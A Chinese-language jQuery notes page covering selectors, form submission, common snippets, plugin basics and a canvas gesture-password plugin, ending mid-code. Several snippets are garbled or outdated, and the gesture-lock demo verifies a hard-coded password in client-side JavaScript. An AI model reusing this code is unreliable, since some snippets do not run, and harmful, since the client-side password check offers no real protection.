※菜鸟教程 ※常用 基本选择器 1234$(&quot;#id&quot;) //ID选择器$(&quot;div&quot;) //元素选择器$(&quot;.classname&quot;) //类选择器$(&quot;.classname,.classname1,#id1&quot;) //组合选择器 层次选择器 1234 $(&quot;#id&gt;.classname &quot;) //子元素选择器$(&quot;#id .classname &quot;) //后代元素选择器$(&quot;#id + .classname &quot;) //紧邻下一个元素选择器$(&quot;#id ~ .classname &quot;) //兄弟元素选择器 过滤选择器(重点) 12345678$(&quot;li:first&quot;) //第一个li$(&quot;li:last&quot;) //最后一个li$(&quot;li:even&quot;) //挑选下标为偶数的li$(&quot;li:odd&quot;) //挑选下标为奇数的li$(&quot;li:eq(4)&quot;) //下标等于 4 的li(第五个 li 元素)$(&quot;li:gt(2)&quot;) //下标大于 2 的li$(&quot;li:lt(2)&quot;) //下标小于 2 的li$(&quot;li:not(#runoob)&quot;) //挑选除 id=&quot;runoob&quot; 以外的所有li 内容过滤选择器 1234$(&quot;div:contains(&#x27;Runob&#x27;)&quot;) // 包含 Runob文本的元素$(&quot;td:empty&quot;) //不包含子元素或者文本的空元素$(&quot;div:has(selector)&quot;) //含有选择器所匹配的元素$(&quot;td:parent&quot;) //含有子元素或者文本的元素 可见性过滤选择器 12$(&quot;li:hidden&quot;) //匹配所有不可见元素，或type为hidden的元素$(&quot;li:visible&quot;) //匹配所有可见元素 属性过滤选择器 1234567$(&quot;div[id]&quot;) //所有含有 id 属性的 div 元素$(&quot;div[id=&#x27;123&#x27;]&quot;) // id属性值为123的div 元素$(&quot;div[id!=&#x27;123&#x27;]&quot;) // id属性值不等于123的div 元素$(&quot;div[id^=&#x27;qq&#x27;]&quot;) // id属性值以qq开头的div 元素$(&quot;div[id$=&#x27;zz&#x27;]&quot;) // id属性值以zz结尾的div 元素$(&quot;div[id*=&#x27;bb&#x27;]&quot;) // id属性值包含bb的div 元素$(&quot;input[id][name$=&#x27;man&#x27;]&quot;) //多属性选过滤，同时满足两个属性的条件的元素 状态过滤选择器 1234$(&quot;input:enabled&quot;) // 匹配可用的 input$(&quot;input:disabled&quot;) // 匹配不可用的 input$(&quot;input:checked&quot;) // 匹配选中的 input$(&quot;option:selected&quot;) // 匹配选中的 option 表单选择器 123456789$(&quot;:input&quot;) //匹配所有 input, textarea, select 和 button 元素$(&quot;:text&quot;) //所有的单行文本框，$(&quot;:text&quot;) 等价于$(&quot;[type=text]&quot;)，推荐使用$(&quot;input:text&quot;)效率更高，下同$(&quot;:password&quot;) //所有密码框$(&quot;:radio&quot;) //所有单选按钮$(&quot;:checkbox&quot;) //所有复选框$(&quot;:submit&quot;) //所有提交按钮$(&quot;:reset&quot;) //所有重置按钮$(&quot;:button&quot;) //所有button按钮$(&quot;:file&quot;) //所有文件域 ※JS/Jquery 表单方式提交总结 submit提交 (1). submit 按钮式提交 缺点：在提交前不可修改提交的form表单数据 123456// 1. html&lt;form method=&quot;post&quot; action=&quot;/../..&quot; &gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;password&quot; name=&quot;pwd&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;&lt;/form&gt; (2). onsubmit方式提交 优点：在请求提交操作(action)时，可对提交的数据进行处理 1234567// 1. html&lt;form id=&#x27;test_form&#x27; action=&#x27;&#x27; method=&#x27;&#x27; onsubmit=&#x27;return checkForm()&#x27;&gt; &lt;input type=&#x27;text&#x27; name=&#x27;username&#x27; value=&#x27;&#x27;/&gt; &lt;input type=&#x27;password&#x27; id=&#x27;input_pwd&#x27; value =&#x27;&#x27;/&gt; // 注意此没有name属性，不会提交 &lt;input type=&#x27;hidden&#x27; name=&#x27;pwd&#x27; id=&#x27;md5_pwd&#x27; value=&#x27;&#x27;/&gt; // 此有name属性，会被form表单提交 &lt;button type=&#x27;submit&#x27;&gt;提交&lt;/button&gt;&lt;/form&gt; 12345678// 2.jsfunction checkForm () &#123; // 点击“提交”按钮，执行的方法 var input_pwd= document.getElementById(&#x27;input_pwd&#x27;); var md5_pwd= document.getElementById(&#x27;md5_pwd&#x27;); md5_pwd.value= toMD5(input_pwd.value); //进行下一步 return true;&#125; formData 提交 1234// 1. html&lt;form id=&quot;photoForm&quot;&gt; &lt;input id=&quot;photoInput&quot; type=&quot;file&quot; title=&quot;图片上传&quot; accept=&quot;.jpg,.jpeg,image/jpg,image/jpeg&quot; name=&quot;myfiles&quot; multiple=&quot;multiple&quot;&gt;照片导入&lt;/form&gt; 1234567891011121314151617181920212223// 2. js$(&#x27;#photoForm input&#x27;).change(function() &#123; var photoForm = $(&#x27;#photoForm&#x27;)[0], photoFormData = new FormData(photoForm), photoFileList = $(&#x27;#photoInput&#x27;)[0].files; // 上传的文件列表 $(&#x27;.loading&#x27;).show(); $.ajax(&#123; type: &#x27;POST&#x27;, url: ZD.url+&quot;/cert/filesUpload&quot;, data: photoFormData, // 告诉jQuery不要去处理发送的数据 processData : false, // 告诉jQuery不要去设置Content-Type请求头 contentType : false, complete:function()&#123; $(&#x27;.loading&#x27;).hide(); $(&quot;#photoForm input&quot;).val(&#x27;&#x27;); &#125;, success:function(d)&#123; // 成功。。 &#125; &#125;);&#125;); 动态添加表单提交, js方式提交 动态追加的form表单 123456var exportForm = $(&#x27;&lt;form action=&quot;&#x27;+ajaxUrl+&#x27;&quot; method=&quot;post&quot;&gt;\\ &lt;input type=&quot;hidden&quot; name=&quot;beginDate&quot; value=&quot;&#x27;+$(&quot;.beginDate&quot;).val()+&#x27;&quot;/&gt;\\ &lt;/form&gt;&#x27;); $(document.body).append(exportForm); exportForm.submit(); // 表单提交 exportForm.remove(); 静态form表单，js方式提交 1234// 1. html&lt;form action=&quot;&#x27;+ajaxUrl+&#x27;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;beginDate&quot; value=&quot;&#x27;+$(&quot;.beginDate&quot;).val()+&#x27;&quot;/&gt;&lt;/form&gt; 123// 2. js/JQuerydocument.getElementById(&quot;form&quot;).submit(); // js写法$(&quot;#form&quot;).submit(); // jquery写法 ※jQuery 常用代码集锦 选择或者不选页面上全部复选框 12345var tog = false; // or true if they are checked on load$(&#x27;a&#x27;).click(function() &#123;$(&quot;input[type=checkbox]&quot;).attr(&quot;checked&quot;,!tog);tog = !tog;&#125;); 取得鼠标的X和Y坐标 123456$(document).mousemove(function(e)&#123;$(document).ready(function() &#123;$().mousemove(function(e)&#123;$(&#x27;#XY&#x27;).html(&quot;Gbin1 X Axis : &quot; + e.pageX + &quot; | Gbin1 Y Axis &quot; + e.pageY);&#125;);&#125;); 判断一个图片是否加载完全 123$(&#x27;#theGBin1Image&#x27;).attr(&#x27;src&#x27;, &#x27;image.jpg&#x27;).load(function() &#123;alert(&#x27;This Image Has Been Loaded&#x27;);&#125;); 判断cookie是否激活或者关闭 123456789101112131415 var dt = new Date(); dt.setSeconds(dt.getSeconds() + 60); document.cookie = &quot;cookietest=1; expires=&quot; + dt.toGMTString(); var cookiesEnabled = document.cookie.indexOf(&quot;cookietest=&quot;) != -1; if(!cookiesEnabled) &#123; //cookies have not been enabled &#125;+ 强制过期cookie ```js var date = new Date(); date.setTime(date.getTime() + (x * 60 * 1000)); $.cookie(&#x27;example&#x27;, &#x27;foo&#x27;, &#123; expires: date &#125;); 在表单中禁用“回车键”，表单的操作中需要防止用户意外的提交表单 12345$(&quot;#form&quot;).keypress(function(e) &#123;if (e.which == 13) &#123;return false;&#125;&#125;); 清除所有的表单数据 1234567891011121314151617181920function clearForm(form) &#123;// iterate over all of the inputs for the form// element that was passed in$(&#x27;:input&#x27;, form).each(function() &#123;var type = this.type;var tag = this.tagName.toLowerCase(); // normalize case// it&#x27;s ok to reset the value attr of text inputs,// password inputs, and textareasif (type == &#x27;text&#x27; || type == &#x27;password&#x27; || tag == &#x27;textarea&#x27;)this.value = &quot;&quot;;// checkboxes and radios need to have their checked state cleared// but should *not* have their &#x27;value&#x27; changedelse if (type == &#x27;checkbox&#x27; || type == &#x27;radio&#x27;)this.checked = false;// select elements need to have their &#x27;selectedIndex&#x27; property set to -1// (this works for both single and multiple select elements)else if (tag == &#x27;select&#x27;)this.selectedIndex = -1;&#125;);&#125;; 禁止多次递交表单 123456789101112131415$(document).ready(function() &#123;$(&#x27;form&#x27;).submit(function() &#123;if(typeof jQuery.data(this, &quot;disabledOnSubmit&quot;) == &#x27;undefined&#x27;) &#123;jQuery.data(this, &quot;disabledOnSubmit&quot;, &#123; submited: true &#125;);$(&#x27;input[type=submit], input[type=button]&#x27;, this).each(function() &#123;$(this).attr(&quot;disabled&quot;, &quot;disabled&quot;);&#125;);return true;&#125;else&#123;return false;&#125;&#125;);&#125;); 自动将数据导入selectbox中 1234567891011$(function()&#123;$(&quot;select#ctlJob&quot;).change(function()&#123;$.getJSON(&quot;/select.php&quot;,&#123;id: $(this).val(), ajax: &#x27;true&#x27;&#125;, function(j)&#123;var options = &#x27;&#x27;;for (var i = 0; i &lt; j.length; i++) &#123;options += &#x27;&lt;option value=&quot;&#x27; + j[i].optionValue + &#x27;&quot;&gt;&#x27; + j[i].optionDisplay + &#x27;&lt;/option&gt;&#x27;;&#125;$(&quot;select#ctlPerson&quot;).html(options);&#125;)&#125;)&#125;) 创建一个嵌套的过滤器 1.filter(&quot;:not(:has(.selected))&quot;) //去掉所有不包含class为.selected的元素 使用has()来判断一个元素是否包含特定的class或者元素 1234//jQuery 1.4.* includes support for the has method. This method will find //if a an element contains a certain other element class or whatever it is //you are looking for and do anything you want to them. $(&quot;input&quot;).has(&quot;.email&quot;).addClass(&quot;email_icon&quot;); 使用jQuery切换样式 12//Look for the media-type you wish to switch then set the href to your new style sheet $(&#x27;link[media=&#x27;screen&#x27;]&#x27;).attr(&#x27;href&#x27;, &#x27;Alternative.css&#x27;); 如何正确使用ToggleClass 123456//Toggle class allows you to add or remove a class //from an element depending on the presence of that //class. Where some developers would use: a.hasClass(&#x27;blueButton&#x27;) ? a.removeClass(&#x27;blueButton&#x27;) : a.addClass(&#x27;blueButton&#x27;); //toggleClass allows you to easily do this using a.toggleClass(&#x27;blueButton&#x27;); 使用jQuery来替换一个元素 1$(&#x27;#thatdiv&#x27;).replaceWith(&#x27;fnuh&#x27;); 绑定一个函数到一个事件 123$(&#x27;#foo&#x27;).bind(&#x27;click&#x27;, function() &#123; alert(&#x27;User clicked on &quot;foo.&quot;&#x27;); &#125;); 使用jQuery预加载图片 12jQuery.preloadImages = function() &#123; for(var i = 0; i&#x27;).attr(&#x27;src&#x27;, arguments[i]); &#125; &#125;; // Usage $.preloadImages(&#x27;image1.gif&#x27;, &#x27;/path/to/image2.png&#x27;, &#x27;some/image3.jpg&#x27;); 设置任何匹配一个选择器的事件处理程序 1234567891011121314$(&#x27;button.someClass&#x27;).live(&#x27;click&#x27;, someFunction);//Note that in jQuery 1.4.2, the delegate and undelegate options have been//introduced to replace live as they offer better support for context//For example, in terms of a table where before you would use..// .live()$(&quot;table&quot;).each(function()&#123;$(&quot;td&quot;, this).live(&quot;hover&quot;, function()&#123;$(this).toggleClass(&quot;hover&quot;);&#125;);&#125;);//Now use..$(&quot;table&quot;).delegate(&quot;td&quot;, &quot;hover&quot;, function()&#123;$(this).toggleClass(&quot;hover&quot;);&#125;); 自动的滚动到页面特定区域 12345678jQuery.fn.autoscroll = function(selector) &#123;$(&#x27;html,body&#x27;).animate(&#123;scrollTop: $(selector).offset().top&#125;,);&#125;//Then to scroll to the class/area you wish to get to like this:$(&#x27;.area_name&#x27;).autoscroll(); 检测各种浏览器 1234Detect Safari (if( $.browser.safari)),Detect IE6 and over (if ($.browser.msie &amp;&amp; $.browser.version &gt; 6 )),Detect IE6 and below (if ($.browser.msie &amp;&amp; $.browser.version &lt;= 6 )),Detect FireFox 2 and above (if ($.browser.mozilla &amp;&amp; $.browser.version &gt;= &#x27;1.8&#x27; ) 限制textarea的字符数量 12345678910111213141516171819202122232425jQuery.fn.maxLength = function(max)&#123;this.each(function()&#123;var type = this.tagName.toLowerCase();var inputType = this.type? this.type.toLowerCase() : null;if(type == &quot;input&quot; &amp;&amp; inputType == &quot;text&quot; || inputType == &quot;password&quot;)&#123;//Apply the standard maxLengththis.maxLength = max;&#125;else if(type == &quot;textarea&quot;)&#123;this.onkeypress = function(e)&#123;var ob = e || event;var keyCode = ob.keyCode;var hasSelection = document.selection? document.selection.createRange().text.length &gt; 0 : this.selectionStart != this.selectionEnd;return !(this.value.length &gt;= max &amp;&amp; (keyCode &gt; 50 || keyCode == 32 || keyCode == 0 || keyCode == 13) &amp;&amp; !ob.ctrlKey &amp;&amp; !ob.altKey &amp;&amp; !hasSelection);&#125;;this.onkeyup = function()&#123;if(this.value.length &gt; max)&#123;this.value = this.value.substring(0,max);&#125;&#125;;&#125;&#125;);&#125;;//Usage:$(&#x27;#gbin1textarea&#x27;).maxLength(500); 使用jQuery克隆元素 1var cloned = $(&#x27;#gbin1div&#x27;).clone(); 元素屏幕居中 123456jQuery.fn.center = function () &#123;this.css(&#x27;position&#x27;,&#x27;absolute&#x27;);this.css(&#x27;top&#x27;, ( $(window).height() - this.height() ) / +$(window).scrollTop() + &#x27;px&#x27;);this.css(&#x27;left&#x27;, ( $(window).width() - this.width() ) / 2+$(window).scrollLeft() + &#x27;px&#x27;);return this;&#125;//Use the above function as: $(&#x27;#gbin1div&#x27;).center(); 简单的tab标签切换 1234567891011121314151617181920212223242526272829303132333435363738394041jQuery(&#x27;#meeting_tabs ul li&#x27;).click(function()&#123;jQuery(this).addClass(&#x27;tabulous_active&#x27;).siblings().removeClass(&#x27;tabulous_active&#x27;);jQuery(&#x27;#tabs_container&gt;.pane:eq(&#x27;+jQuery(this).index()+&#x27;)&#x27;).show().siblings().hide(); &#125;)&lt;div id=&quot;meeting_tabs&quot;&gt; &lt;ul&gt; &lt;li class=&quot;tabulous_active&quot;&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;进行中&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;未开始&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;已结束&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;全部&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;div id=&quot;tabs_container&quot;&gt;&lt;div class=&quot;pane&quot; &gt;1&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;2&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;3&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;4&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;jQuery(&#x27;#meeting_tabs ul li&#x27;).click(function()&#123;jQuery(this).addClass(&#x27;tabulous_active&#x27;).siblings().removeClass(&#x27;tabulous_active&#x27;);jQuery(&#x27;#tabs_container&gt;.pane:eq(&#x27;+jQuery(this).index()+&#x27;)&#x27;).show().siblings().hide(); &#125;)&lt;div id=&quot;meeting_tabs&quot;&gt; &lt;ul&gt; &lt;li class=&quot;tabulous_active&quot;&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;进行中&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;未开始&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;已结束&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot; title=&quot;&quot;&gt;全部&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;div id=&quot;tabs_container&quot;&gt;&lt;div class=&quot;pane&quot; &gt;1&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;2&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;3&lt;/div&gt;&lt;div class=&quot;pane&quot; &gt;4&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; ※query操作表单元素代码 1234567/*假设在一个表单中有一个按钮id=&quot;save&quot;*/$(document).ready(function()&#123; $(&quot;#save&quot;).click(function()&#123; $(&quot;#save&quot;).attr(&quot;disabled&quot;,true);//设为不可用 $(&quot;#form1&quot;)[0].submit();//如果你有很多个id为form1的表单也没关系，只有第一个会提交的哈哈. &#125;);&#125;); 取下拉菜单选中项的文本 12$(&quot;#select option[selected]&quot;).text();//select和option之间有空格，option为select的子元素 $(&quot;#select option:selected&quot;).text();//如果写成$(&quot;#select&quot;).text();会把所有下拉菜单的文本选择出来 获取和设置下拉菜单的值 12$(&quot;#select&quot;).val();//取值 $(&quot;#select&quot;).val(&quot;value&quot;);//设置,如果select中有值为value的选项,该选项就会被选中,如果不存在,则select不做任何变动 清空下拉菜单 12$(&quot;#select&quot;).empty(); $(&quot;#select&quot;).html(&quot;&quot;); 给下列菜单添加元素 12$(&#x27;&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;&#x27;).appendto($(&quot;#select&quot;)); $(&quot;#select&quot;).append(&#x27;&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;&#x27;); 取单选框值 1$(&quot;#id[checked]&quot;).val(); 单选或复选按钮的选择 1234$(&quot;#id[value=val]&quot;).attr(&quot;checked&quot;,true);//选择 $(&quot;#id[value=val]&quot;).attr(&quot;checked&quot;,&quot;&quot;);//取消选择 $(&quot;#id[value=val]&quot;).attr(&quot;checked&quot;,false);//取消选择 $(&quot;#id[value=val]&quot;).removeattr(&quot;checked&quot;);//取消选择 取复选框值 1234$(&quot;input[type=checkbox][checked]&quot;).each(function()&#123; alert($(this).val()); &#125;) //如果用$(&quot;input[type=checkbox][checked]&quot;).val(),只会返回第一个被选中的值 判断单选或复选框是否被选中 123if($(&quot;#id&quot;).attr(&quot;checked&quot;))&#123;&#125;//判断选中 if($(&quot;#id&quot;).attr(&quot;checked&quot;)==true)&#123;&#125;//判断选中 if($(&quot;#id&quot;).attr(&quot;checked&quot;)==undefined)&#123;&#125;//判断未选中 元素可用不可用 12$(&quot;#id&quot;).attr(&quot;disabled&quot;,false);//设为可用 $(&quot;#id&quot;).attr(&quot;disabled&quot;,true);//设为不可用 判断元素可用不可用 12if($(&quot;#id&quot;).attr(&quot;disabled&quot;))&#123;&#125;//判断不可用 if($(&quot;#id&quot;).attr(&quot;disabled&quot;)==undefined)&#123;&#125;//判断可用 文本框操作 1234取 值：var textval = $(&quot;#text_id&quot;).attr(&quot;value&quot;);var textval = $(&quot;#text_id&quot;).val();清除内容：$(&quot;#txt&quot;).attr(&quot;value&quot;,&quot;&quot;);填充内容：$(&quot;#txt&quot;).attr(&quot;value&quot;,&#x27;123&#x27;); 文本域操作 1234取 值：var textval = $(&quot;#text_id&quot;).attr(&quot;value&quot;);var textval = $(&quot;#text_id&quot;).val();清除内容：$(”#txt”).attr(&quot;value&quot;,&quot;&quot;);填充内容：$(”#txt”).attr(&quot;value&quot;,&#x27;123&#x27;); 单选按钮操作 12取 值：var valradio = $(&quot;input[@type=radio][@checked]&quot;).val(); //只有一组Radio情况下var valradio =$(&#x27;input[@name=chart][@checked]&#x27;).val(); //多组Radio情况下，根据name取一组的值 下拉框操作 1234取 值：var selectval = $(&#x27;#sell&#x27;).val();设置选中：$(&quot;#select_id&quot;).attr(&quot;value&quot;,&#x27;test&#x27;);//设置value=test的项目为当前选中项添加新项：$(&quot;&lt;option value=&#x27;test&#x27;&gt;test&lt;/option&gt;&lt;option value=&#x27;test2&#x27;&gt;test2&lt;/option&gt;&quot;).appendTo(&quot;#select_id&quot;)//添加下拉框的option清空下拉框：$(&quot;#select_id&quot;).empty()；//清空下拉框 多选框操作 123取 值：$(&quot;#chk_id&quot;).attr(&quot;checked&quot;,&#x27;&#x27;);//未选中的值$(&quot;#chk_id&quot;).attr(&quot;checked&quot;,true);//选中的值if($(&quot;#chk_id&quot;).attr(&#x27;checked&#x27;)==undefined) //判断是否已经选中 ※写JQuery插件的基本知识 用JQuery写插件时，最核心的方法有如下两个： 123$.extend(object) 可以理解为JQuery 添加一个静态方法。$.fn.extend(object) 可以理解为JQuery实例添加一个方法。 基本的定义与调用： 1234567891011/* $.extend 定义与调用* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */$.extend(&#123; fun1: function () &#123; alert(&quot;执行方法一&quot;); &#125; &#125;);$.fun1();/* $.fn.extend 定义与调用* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */$.fn.extend(&#123; fun2: function () &#123; alert(&quot;执行方法2&quot;); &#125; &#125;);$(this).fun2();//等同于$.fn.fun3 = function () &#123; alert(&quot;执行方法三&quot;); &#125;$(this).fun3(); jQuery(function () { }); 与 (function ($) { })(jQuery);的区别： 12345678jQuery(function () &#123; &#125;);//相当于$(document).ready(function () &#123; &#125;);/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */(function ($) &#123; &#125;)(jQuery);//相当于var fn = function ($) &#123; &#125;;fn(jQuery); jQuery(function () { });是某个DOM元素加载完毕后执行方法里的代码。 (function ($) { })(jQuery); 定义了一个匿名函数，其中jQuery代表这个匿名函数的实参。通常用在JQuery插件开发中，起到了定义插件的私有域的作用。 ※jQuery实现手势解锁密码特效 HTML： 12&lt;div id=&quot;gesturepwd&quot; style=&quot;position: absolute;width:440px;height:440px;left:50%;top:50%;margin-left:-220px;margin-top:-220px&quot;&gt;&lt;/div&gt; 首次渲染： 123456789101112$(&quot;#gesturepwd&quot;).GesturePasswd(&#123; margin:&quot;0px auto&quot;, backgroundColor:&quot;#252736&quot;, //背景色 color:&quot;#FFFFFF&quot;, //主要的控件颜色 roundRadii:42, //大圆点的半径 pointRadii:6, //大圆点被选中时显示的圆心的半径 space:60, //大圆点之间的间隙 width:440, //整个组件的宽度 height:440, //整个组件的高度 lineColor:&quot;#00aec7&quot;, //用户划出线条的颜色 zindex :100 //整个组件的css z-index属性 &#125;) 密码判断代码：(这里的密码“34569”意思为页面上从上到下，从左到右的9个原点中的5个点) 123456789101112131415161718192021222324$(&quot;#gesturepwd&quot;).on(&quot;hasPasswd&quot;,function(e,passwd)&#123; var result; if(passwd == &quot;34569&quot;)&#123;//密码设置处 result=true; &#125; else &#123; alert(&quot;密码错误!&quot;); result=false; &#125; if(result == true)&#123; $(&quot;#gesturepwd&quot;).trigger(&quot;passwdRight&quot;); setTimeout(function()&#123; //密码验证正确后的其他操作，打开新的页面等。。。 //alert(&quot;密码正确！&quot;) //window.location.href=&quot;../统计图/index.html&quot;; alert(&quot;验证通过!&quot;); &#125;,500); //延迟半秒以照顾视觉效果 &#125; else&#123; $(&quot;#gesturepwd&quot;).trigger(&quot;passwdWrong&quot;); //密码验证错误后的其他操作。。。 &#125; &#125;) 核心脚本调用展示：function ($) &#123; var GesturePasswd= function (element, options) &#123; this.$element = $(element); this.options = options; var that=this; this.pr=options.pointRadii; this.rr=options.roundRadii; this.o=options.space; this.color=options.color; //全局样式 this.$element.css(&#123; &quot;position&quot;:&quot;relation&quot;, &quot;width&quot;:this.options.width, &quot;height&quot;:this.options.height, &quot;background-color&quot;:options.backgroundColor, &quot;overflow&quot;:&quot;hidden&quot;, &quot;cursor&quot;:&quot;default&quot; &#125;); //选择器规范 if(! $(element).attr(&quot;id&quot;)) $(element).attr(&quot;id&quot;,(Math.random()*65535).toString()); this.id=&quot;#&quot;+$(element).attr(&quot;id&quot;); var Point = function (x,y)&#123; this.x =x;this.y=y &#125;; this.result=&quot;&quot;; this.pList=[]; this.sList=[]; this.tP=new Point(0,0); this.$element.append(&#x27;&lt;canvas class=&quot;main-c&quot; width=&quot;&#x27;+options.width+&#x27;&quot; height=&quot;&#x27;+options.height+&#x27;&quot; &gt;&#x27;); //this.$element.append(&#x27;&lt;canvas class=&quot;main-p&quot; width=&quot;&#x27;+options.width+&#x27;&quot; height=&quot;&#x27;+options.height+&#x27;&quot; &gt;&#x27;); this.$c= $(this.id+&quot; .main-c&quot;)[0]; this.$ctx=this.$c.getContext(&#x27;2d&#x27;); this.initDraw=function()&#123; this.$ctx.strokeStyle=this.color; this.$ctx.lineWidth=2; for(var j=0; j&lt;3;j++ )&#123; for(var i =0;i&lt;3;i++)&#123; this.$ctx.moveTo(this.o/2+this.rr*2+i*(this.o+2*this.rr),this.o/2+this.rr+j*(this.o+2*this.rr)); this.$ctx.arc(this.o/2+this.rr+i*(this.o+2*this.rr),this.o/2+this.rr+j*(this.o+2*this.rr),this.rr,0,2*Math.PI); var tem=new Point(this.o/2+this.rr+i*(this.o+2*this.rr),this.o/2+this.rr+j*(this.o+2*this.rr)); if (that.pList.length &lt; 9) this.pList.push(tem); &#125; &#125; this.$ctx.stroke(); this.initImg=this.$ctx.getImageData(0,0,this.options.width,this.options.height); &#125;; this.initDraw(); //this.$ctx.stroke(); this.isIn=function(x,y)&#123; for (var p in that.pList)&#123; //console.log(that.pList[p][x]); // console.log(( Math.pow((x-that.pList[p][x]),2)+Math.pow((y-that.pList[p][y]),2))); if(( Math.pow((x-that.pList[p][&quot;x&quot;]),2)+Math.pow((y-that.pList[p][&quot;y&quot;]),2) ) &lt; Math.pow(this.rr,2))&#123; return that.pList[p]; &#125; &#125; return 0; &#125;; this.pointDraw =function(c)&#123; if (arguments.length&gt;0)&#123; that.$ctx.strokeStyle=c; that.$ctx.fillStyle=c; &#125; for (var p in that.sList)&#123; that.$ctx.moveTo(that.sList[p][&quot;x&quot;]+that.pr,that.sList[p][&quot;y&quot;]); that.$ctx.arc(that.sList[p][&quot;x&quot;],that.sList[p][&quot;y&quot;],that.pr,0,2*Math.PI); that.$ctx.fill(); &#125; &#125;; this.lineDraw=function (c)&#123; if (arguments.length&gt;0)&#123; that.$ctx.strokeStyle=c; that.$ctx.fillStyle=c; &#125; if(that.sList.length &gt; 0)&#123; for( var p in that.sList)&#123; if(p == 0)&#123; console.log(that.sList[p][&quot;x&quot;],that.sList[p][&quot;y&quot;]); that.$ctx.moveTo(that.sList[p][&quot;x&quot;],that.sList[p][&quot;y&quot;]); continue; &#125; that.$ctx.lineTo(that.sList[p][&quot;x&quot;],that.sList[p][&quot;y&quot;]); console.log(that.sList[p][&quot;x&quot;],that.sList[p][&quot;y&quot;]); &#125; &#125; &#125;; this.allDraw =function(c)&#123; if (arguments.length&gt;0)&#123; this.pointDraw(c); this.lineDraw(c); that.$ctx.stroke(); &#125; else &#123; this.pointDraw(); this.lineDraw(); &#125; &#125;; this.draw=function(x,y)&#123; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); //that.initDraw(); that.$ctx.putImageData(this.initImg,0,0); that.$ctx.lineWidth=4; that.pointDraw(that.options.lineColor); that.lineDraw(that.options.lineColor); that.$ctx.lineTo(x,y); that.$ctx.stroke(); &#125;; this.pointInList=function(poi,list)&#123; for (var p in list)&#123; if( poi[&quot;x&quot;] == list[p][&quot;x&quot;] &amp;&amp; poi[&quot;y&quot;] == list[p][&quot;y&quot;])&#123; return ++p; &#125; &#125; return false; &#125;; this.touched=false; $(this.id).on (&quot;mousedown touchstart&quot;,&#123;that:that&#125;,function(e)&#123; e.data.that.touched=true; &#125;); $(this.id).on (&quot;mouseup touchend&quot;,&#123;that:that&#125;,function(e)&#123; e.data.that.touched=false; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); that.$ctx.putImageData(e.data.that.initImg,0,0); that.allDraw(that.options.lineColor); // that.$ctx.stroke(); for(var p in that.sList)&#123; if(e.data.that.pointInList(that.sList[p], e.data.that.pList))&#123; e.data.that.result= e.data.that.result+(e.data.that.pointInList(that.sList[p], e.data.that.pList)).toString(); &#125; &#125; $(element).trigger(&quot;hasPasswd&quot;,that.result); &#125;); // $(this.id).on(&#x27;touchmove mousemove&#x27;,&#123;that:that&#125;, function(e) &#123; if(e.data.that.touched)&#123; var x= e.pageX || e.originalEvent.targetTouches[0].pageX ; var y = e.pageY || e.originalEvent.targetTouches[0].pageY; x=x-that.$element.offset().left; y=y-that.$element.offset().top; var p = e.data.that.isIn(x, y); console.log(x) if(p != 0 )&#123; if ( !e.data.that.pointInList(p,e.data.that.sList))&#123; e.data.that.sList.push(p); &#125; &#125; console.log( e.data.that.sList); e.data.that.draw(x, y); &#125; &#125;); $(this.id).on(&#x27;passwdWrong&#x27;,&#123;that:that&#125;, function(e) &#123; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); that.$ctx.putImageData(that.initImg,0,0); that.allDraw(&quot;#cc1c21&quot;); that.result=&quot;&quot;; that.pList=[]; that.sList=[]; setTimeout(function()&#123; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); that.initDraw() &#125;,500) &#125;); $(this.id).on(&#x27;passwdRight&#x27;,&#123;that:that&#125;, function(e) &#123; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); that.$ctx.putImageData(that.initImg,0,0); that.allDraw(&quot;#00a254&quot;); that.result=&quot;&quot;; that.pList=[]; that.sList=[]; setTimeout(function()&#123; that.$ctx.clearRect(0,0,that.options.width,that.options.height); that.$ctx.beginPath(); that.initDraw() &#125;,500) &#125;); &#125;; GesturePasswd.DEFAULTS = &#123; zindex :100, roundRadii:25, pointRadii:6, space:30, width:240, height:240, lineColor:&quot;#00aec7&quot;, backgroundColor:&quot;#252736&quot;, color:&quot;#FFFFFF&quot; &#125;; function Plugin(option,arg) &#123; return this.each(function () &#123; var $this = $(this); var options = $.extend(&#123;&#125;, GesturePasswd.DEFAULTS, typeof option == &#x27;object&#x27; &amp;&amp; option); var data = $this.data(&#x27;GesturePasswd&#x27;); var action = typeof option == &#x27;string&#x27; ? option : NaN; if (!data) 